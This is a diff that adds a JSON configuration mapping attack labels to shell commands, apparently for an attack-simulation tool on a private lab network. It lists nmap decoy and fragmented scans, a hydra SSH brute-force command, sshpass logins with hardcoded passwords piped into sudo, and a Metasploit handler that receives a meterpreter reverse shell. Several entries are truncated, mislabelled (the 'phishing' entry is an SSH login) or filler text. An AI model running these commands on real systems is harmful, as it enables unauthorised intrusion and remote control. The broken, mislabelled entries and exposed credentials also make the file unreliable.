@@ -1,0 +1,43 @@
+{
+  "portScan": {
+    "label": "Port Scan",
+    "command": ["nmap -sT 10.229.40.130","sudo nmap -D RND:10 -f --mtu 16 10.229.40.75"]
+  },
+  "bruteForce": {
+    "label": "Brute Force",
+    "command": "hydra -l admin -P password.txt ssh://10.229.40.130"
+  },
+  "sshAttack": {
+    "label": "SSH Attack",
+    "command": "sshpass -p 'password' ssh user@host_ip"
+  },
+  "dosAttack": {
+    "label": "DoS Attack",
+    "command": [
+      "python3 dos.py"]
+  },
+  "malware": {
+    "label": "Malware Attack",
+    "command": [
+      "msfconsole",
+      "use exploit/multi/handler",
+      "set payload linux/x64/meterpreter/reverse_tcp",
+      "set LHOST 10.229.40.138",
+      "set LPORT 4444",
+      "exploit",
+      "10.229.40.239"
+    ]
+  },
+  "phishing": {
+    "label": "Phishing Attack",
+    "command": "sshpass -p 'anmol' ssh -tt anmol@{targetIP} 'echo crlg#123 | sudo -S bash -c"
+  },
+  "data-exploitation": {
+    "label": "Data Exploitation",
+    "command": "\"sshpass -p 'anmol' ssh -tt anmol@{targetIP} 'echo crlg#123 | sudo -S bash -c\""
+  },
+  "lateral-movement": {
+    "label": "Lateral Movement",
+    "command": "sdfshgjshak"
+  }
+}
